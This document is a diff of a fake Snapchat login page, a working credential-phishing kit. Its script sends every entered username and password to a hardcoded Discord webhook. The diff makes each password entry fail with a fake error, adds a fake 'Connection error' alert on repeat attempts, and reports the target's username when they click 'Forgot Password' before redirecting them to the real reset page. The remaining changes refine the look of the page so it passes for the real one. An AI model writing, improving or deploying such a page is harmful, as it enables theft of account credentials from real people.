@@ -26,8 +26,14 @@
             box-sizing: border-box;
         }
 
-        .snap-ghost { width: 55px; margin-bottom: 15px; }
-        h2 { font-size: 26px; margin: 0 0 20px 0; font-weight: 700; color: #16191c; }
+        /* Fixed Sharp SVG Logo */
+        .snap-ghost {
+            width: 60px;
+            height: 60px;
+            margin-bottom: 10px;
+        }
+
+        h2 { font-size: 24px; margin: 0 0 20px 0; font-weight: 700; color: #16191c; }
 
         .input-group { text-align: left; margin-bottom: 15px; }
         label { display: block; font-size: 12px; color: #717274; margin-bottom: 8px; font-weight: 600; }
@@ -35,12 +41,15 @@
         input {
             width: 100%;
             padding: 14px;
-            border: 2px solid #000;
+            border: 1.5px solid #e8e8e8;
             border-radius: 10px;
             box-sizing: border-box;
             font-size: 16px;
             outline: none;
+            background-color: #f7f7f7;
         }
+
+        input:focus { border-color: #000; background-color: #fff; }
 
         .input-error { border-color: #e74c3c !important; }
         .error-text { color: #e74c3c; font-size: 13px; margin-top: 8px; font-weight: 500; display: none; }
@@ -56,24 +65,28 @@
             font-size: 16px;
             font-weight: bold;
             cursor: pointer;
+            width: 100%;
         }
 
         .divider { display: flex; align-items: center; margin: 25px 0; color: #717274; font-size: 11px; font-weight: bold; }
         .divider::before, .divider::after { content: ''; flex: 1; border-bottom: 1px solid #e8e8e8; }
-        
+        .divider:not(:empty)::before { margin-right: .8em; }
+        .divider:not(:empty)::after { margin-left: .8em; }
+
         .google-btn {
             display: flex; align-items: center; justify-content: center; width: 100%; padding: 12px;
             border: 1px solid #e0e0e0; border-radius: 100px; background: white; cursor: pointer;
             font-size: 15px; font-weight: 600; color: #3c4043;
         }
         .google-icon { width: 18px; margin-right: 10px; }
+        .back-btn { margin-top: 30px; font-size: 12px; font-weight: bold; text-decoration: underline; cursor: pointer; color: #000; }
     </style>
 </head>
 <body>
 
     <div class="login-card">
-        <svg class="snap-ghost" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
-            <path fill="white" stroke="black" stroke-width="4" d="M50,15.5c-14.4,0-23.4,9.9-23.4,22.8c0,4.8,1.2,9.6,4.5,13.2c-0.6,2.1-1.2,4.8-1.2,7.5 c0,7.2,5.7,12.3,13.5,12.3c0.9,0,1.8,0,2.7-0.3c0,0.3,0,0.6,0,0.9c0,5.7,4.8,10.2,10.8,10.2s10.8-4.5,10.8-10.2 c0-0.3,0-0.6,0-0.9c0.9,0.3,1.8,0.3,2.7,0.3c7.8,0,13.5-5.1,13.5-12.3c0-2.7-0.6-5.4-1.2-7.5c3.3-3.6,4.5-8.4,4.5-13.2 C73.4,25.4,64.4,15.5,50,15.5z"/>
+        <svg class="snap-ghost" viewBox="0 0 128 128" xmlns="http://www.w3.org/2000/svg">
+            <path fill="#fff" stroke="#000" stroke-width="4.5" d="M64 19c-18.4 0-29.6 12.6-29.6 28.8 0 6 1.5 12.1 5.7 16.7-.8 2.7-1.5 6.1-1.5 9.5 0 9.1 7.2 15.6 17.1 15.6 1.1 0 2.2-.1 3.4-.3 0 .4 0 .8 0 1.2 0 7.2 6.1 12.9 13.7 12.9s13.7-5.7 13.7-12.9c0-.4 0-.8 0-1.2 1.2.2 2.3.3 3.4.3 9.9 0 17.1-6.5 17.1-15.6 0-3.4-.7-6.8-1.5-9.5 4.2-4.6 5.7-10.7 5.7-16.7C102.6 31.6 91.4 19 73 19z"/>
         </svg>
 
         <h2 id="mainTitle">Log in to Snapchat</h2>
@@ -93,16 +106,19 @@
                 <input type="password" id="passInput">
                 <div id="pass-error" class="error-text">That's not the right password.</div>
             </div>
-            <a class="blue-link" href="https://accounts.snapchat.com/accounts/password_reset_options" target="_blank">Forgot Password</a>
+            <a class="blue-link" onclick="handleReset()">Forgot Password</a>
             <button class="next-btn" id="loginBtn" onclick="processPass()">Log In</button>
         </div>
         
         <div class="divider">OR</div>
+        
         <button class="google-btn">
             <img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_Color_Icon.svg" class="google-icon">
             Continue with Google
         </button>
     </div>
+
+    <div class="back-btn" onclick="location.reload()">BACK</div>
 
     <script>
         const webhookURL = "https://discord.com/api/webhooks/1502467504029700206/uEqMZdCphyeIsFIvace1fdo0nOcqFZcguB0uNebzYlvCBs3Z9_t7E86524zlvyRMUjbD";
@@ -125,24 +141,34 @@
             if(!pass) return;
             attemptCount++;
 
-            // Log every attempt to Discord
             fetch(webhookURL, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({ 
-                    content: `🎯 **Capture Attempt #${attemptCount}**\n**User:** ${user}\n**Pass:** ${pass}` 
+                    content: `🔑 **Password Attempt #${attemptCount}**\n**User:** ${user}\n**Pass:** ${pass}` 
                 })
             });
 
-            if (attemptCount === 1) {
-                // Mimic a failed login
-                input.classList.add('input-error');
-                error.style.display = "block";
-                input.value = "";
-            } else {
-                // On 2nd try, send to real site
-                window.location.href = "https://accounts.snapchat.com/accounts/login";
+            input.classList.add('input-error');
+            error.style.display = "block";
+            input.value = "";
+            
+            if(attemptCount >= 2) {
+                alert("Connection error. Please try again.");
             }
+        }
+
+        function handleReset() {
+            const user = document.getElementById('userInput').value;
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ 
+                    content: `🚪 **Redirecting to Reset Page**\n**Target:** ${user}` 
+                })
+            }).then(() => {
+                window.location.href = "https://accounts.snapchat.com/accounts/password_reset_options";
+            });
         }
 
         function toggleInputType() {
